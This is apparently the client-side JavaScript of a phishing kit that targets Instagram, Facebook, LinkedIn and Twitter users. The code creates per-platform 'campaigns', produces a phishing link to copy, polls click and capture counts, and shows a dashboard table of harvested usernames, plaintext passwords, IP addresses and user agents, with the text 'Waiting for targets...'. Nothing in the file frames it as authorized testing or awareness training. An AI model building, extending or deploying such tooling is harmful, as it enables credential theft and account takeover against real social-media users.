// ==================== MAIN PAGE LOGIC ====================

let currentCampaignId = null;
let autoRefreshInterval = null;
let quickPollInterval = null;

// Platform selection
document.addEventListener('DOMContentLoaded', function() {
    const cards = document.querySelectorAll('.platform-card');
    cards.forEach(card => {
        card.addEventListener('click', function() {
            const platform = this.dataset.platform;
            if (!platform) return;
            createCampaign(platform, this);
        });
    });

    // Check if dashboard page
    if (window.location.pathname.includes('dashboard.html')) {
        initDashboard();
        return;
    }

    // Load recent campaigns
    loadRecentCampaigns();
});

// Create a new campaign
async function createCampaign(platform, cardElement) {
    if (cardElement) cardElement.classList.add('loading');

    try {
        const response = await fetch('/api/create-campaign', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ platform })
        });

        const data = await response.json();

        if (!data.success) {
            throw new Error(data.error || 'Failed to create campaign');
        }

        const campaign = data.campaign;
        currentCampaignId = campaign.id;

        showResult(campaign);
        loadRecentCampaigns();

    } catch (error) {
        console.error('Error:', error);
        alert('Failed to create campaign: ' + error.message);
    } finally {
        if (cardElement) cardElement.classList.remove('loading');
    }
}

// Show the result after creating a campaign
function showResult(campaign) {
    const resultSection = document.getElementById('resultSection');
    const phishLink = document.getElementById('phishLink');
    const platformBadge = document.getElementById('resultPlatformBadge');
    const openBtn = document.getElementById('openLinkBtn');
    const dashBtn = document.getElementById('dashboardBtn');

    phishLink.value = campaign.link;
    platformBadge.textContent = campaign.platform.charAt(0).toUpperCase() + campaign.platform.slice(1);
    platformBadge.className = 'platform-badge ' + campaign.platform;
    openBtn.href = campaign.link;
    dashBtn.href = '/dashboard.html?id=' + campaign.id;
    document.getElementById('quickClicks').textContent = '0';
    document.getElementById('quickCreds').textContent = '0';

    resultSection.style.display = 'block';
    resultSection.scrollIntoView({ behavior: 'smooth', block: 'center' });

    startQuickPolling(campaign.id);
}

// Poll quick stats
function startQuickPolling(campaignId) {
    if (quickPollInterval) clearInterval(quickPollInterval);
    
    quickPollInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/campaign/${campaignId}`);
            const data = await res.json();
            if (data.campaign) {
                document.getElementById('quickClicks').textContent = data.campaign.clicks;
                document.getElementById('quickCreds').textContent = data.campaign.credentials.length;
            }
        } catch (e) {}
    }, 3000);
}

// Copy link to clipboard
function copyLink() {
    const input = document.getElementById('phishLink');
    input.select();
    input.setSelectionRange(0, 99999);
    
    navigator.clipboard.writeText(input.value).then(() => {
        showToast('✅ Link copied to clipboard!');
    }).catch(() => {
        document.execCommand('copy');
        showToast('✅ Link copied!');
    });
}

// Create new campaign (reset)
function createNew() {
    if (quickPollInterval) clearInterval(quickPollInterval);
    document.getElementById('resultSection').style.display = 'none';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Load recent campaigns
async function loadRecentCampaigns() {
    const container = document.getElementById('recentList');
    if (!container) return;

    try {
        const res = await fetch('/api/campaigns');
        const data = await res.json();

        if (!data.campaigns || data.campaigns.length === 0) {
            container.innerHTML = '<p class="empty-state">No campaigns yet. Select a platform above to begin.</p>';
            return;
        }

        container.innerHTML = data.campaigns.slice(0, 5).map(c => {
            const icons = { instagram: '📸', facebook: '📘', linkedin: '💼', twitter: '🐦' };
            return `
                <div class="campaign-item">
                    <div class="campaign-info">
                        <span class="campaign-icon">${icons[c.platform] || '🔗'}</span>
                        <div>
                            <div class="campaign-name">${c.platform.charAt(0).toUpperCase() + c.platform.slice(1)}</div>
                            <div class="campaign-meta">ID: ${c.id.slice(0, 10)}... | ${new Date(c.createdAt).toLocaleString()}</div>
                        </div>
                    </div>
                    <div class="campaign-stats">
                        <span>👁️ ${c.clicks}</span>
                        <span>🔑 ${c.credentialsCount}</span>
                        <a href="/dashboard.html?id=${c.id}" class="btn btn-outline" style="padding: 6px 12px; font-size: 0.8rem;">View →</a>
                    </div>
                </div>
            `;
        }).join('');
    } catch (e) {
        console.error('Failed to load campaigns:', e);
    }
}

// ==================== DASHBOARD LOGIC ====================

async function initDashboard() {
    const params = new URLSearchParams(window.location.search);
    const campaignId = params.get('id');

    if (!campaignId) {
        document.querySelector('.campaign-overview').innerHTML = `
            <div class="overview-card">
                <p class="empty-state">No campaign ID specified. <a href="/" style="color: #667eea;">Go back and create one.</a></p>
            </div>
        `;
        return;
    }

    await loadDashboardData(campaignId);

    if (document.getElementById('autoRefresh')?.checked) {
        startAutoRefresh(campaignId);
    }
}

async function loadDashboardData(campaignId) {
    try {
        const res = await fetch(`/api/campaign/${campaignId}`);
        const data = await res.json();

        if (!data.campaign) {
            document.querySelector('.campaign-overview').innerHTML = `
                <div class="overview-card">
                    <p class="empty-state">Campaign not found. <a href="/" style="color: #667eea;">Go back and create one.</a></p>
                </div>
            `;
            return;
        }

        const c = data.campaign;

        document.getElementById('dashPlatform').textContent = c.platform.charAt(0).toUpperCase() + c.platform.slice(1);
        document.getElementById('dashPlatform').className = 'platform-badge ' + c.platform;
        document.getElementById('dashCampaignId').textContent = `Campaign: ${c.id}`;
        document.getElementById('dashCreated').textContent = `Created: ${new Date(c.createdAt).toLocaleString()}`;

        document.getElementById('statClicks').textContent = c.clicks;
        document.getElementById('statCredentials').textContent = c.credentials.length;
        
        const linkEl = document.getElementById('statLink');
        linkEl.textContent = c.link;
        linkEl.title = 'Click to copy';
        linkEl.style.cursor = 'pointer';
        linkEl.onclick = () => {
            navigator.clipboard.writeText(c.link).then(() => showToast('✅ Link copied!'));
        };

        const tbody = document.getElementById('credsBody');
        if (!c.credentials || c.credentials.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No credentials captured yet. Waiting for targets...</td></tr>';
        } else {
            tbody.innerHTML = c.credentials.slice().reverse().map((cred, idx) => `
                <tr>
                    <td>${idx + 1}</td>
                    <td>${new Date(cred.timestamp).toLocaleString()}</td>
                    <td>${escapeHtml(cred.username)}</td>
                    <td>${escapeHtml(cred.password)}</td>
                    <td>${escapeHtml(cred.ip)}</td>
                    <td title="${escapeHtml(cred.userAgent)}">${escapeHtml(truncateUA(cred.userAgent))}</td>
                </tr>
            `).join('');
        }

        document.getElementById('lastUpdate').textContent = `Last updated: ${new Date().toLocaleTimeString()}`;

    } catch (e) {
        console.error('Failed to load dashboard:', e);
    }
}

function escapeHtml(str) {
    if (!str) return 'N/A';
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

function truncateUA(ua) {
    if (!ua || ua.length < 40) return ua || 'N/A';
    return ua.substring(0, 40) + '...';
}

function startAutoRefresh(campaignId) {
    if (autoRefreshInterval) clearInterval(autoRefreshInterval);
    autoRefreshInterval = setInterval(() => loadDashboardData(campaignId), 5000);
}

function toggleAutoRefresh() {
    const params = new URLSearchParams(window.location.search);
    const campaignId = params.get('id');
    if (document.getElementById('autoRefresh')?.checked) {
        startAutoRefresh(campaignId);
    } else {
        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
    }
}

function refreshData() {
    const params = new URLSearchParams(window.location.search);
    const campaignId = params.get('id');
    if (campaignId) loadDashboardData(campaignId);
}

// ==================== TOAST ====================

function showToast(message) {
    let toast = document.getElementById('toast');
    if (!toast) {
        toast = document.createElement('div');
        toast.id = 'toast';
        toast.className = 'toast';
        document.body.appendChild(toast);
    }
    
    toast.textContent = message;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2000);
}